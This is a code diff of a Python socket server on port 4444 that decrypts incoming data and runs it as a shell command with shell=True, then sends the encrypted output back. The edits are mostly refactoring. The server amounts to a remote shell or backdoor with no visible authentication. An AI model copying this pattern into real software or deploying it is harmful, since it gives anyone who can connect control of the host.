@@ -14,7 +14,6 @@ class Server(Security):
         self.bind_port = 4444
         self.log_file = getcwd() + "\\Logs\\server_log.txt"
         self.buffer_size = 128
-        self.def_encoding = "utf-8"
 
     def print_and_log(self, data):
         with open(self.log_file, "a+") as log_file:
@@ -33,13 +32,13 @@ class Server(Security):
             print(f"\n[*] Send & Recv buffer - ({self.buffer_size} Bytes)")
 
             while True:
-                data_block = client_socket.recv(self.buffer_size).decode(self.def_encoding)
+                data_block = client_socket.recv(self.buffer_size).decode(self.default_encoding)
                 self.print_and_log(f"[~] Data Block {count} ({len(data_block)} Bytes) - {data_block}")
 
                 if not data_block:
                     break
 
-                client_socket.sendall(received_data.encode(self.def_encoding))
+                client_socket.sendall(received_data.encode(self.default_encoding))
                 data_list.append(data_block)
                 count += 1
 
@@ -60,14 +59,15 @@ class Server(Security):
 
                 try:
                     command = decrypted_data
-                    output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-                
-                except:
-                    output = b"Failed to execute command."
+                    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
+                    result = result.stdout
 
-            encrypted_reply = self.generate_encrypted_data(output.decode(self.def_encoding))
+                except Exception as error:
+                    result = f"{error}\n".encode(self.default_encoding)
+
+            encrypted_reply = self.generate_encrypted_data(result.decode(self.default_encoding))
               
-            client_socket.sendall(encrypted_reply.encode(self.def_encoding))
+            client_socket.sendall(encrypted_reply.encode(self.default_encoding))
             self.print_and_log(f"\n[+] Sending back reply ({len(encrypted_reply)} Bytes) - {encrypted_reply}")
 
             client_socket.close()
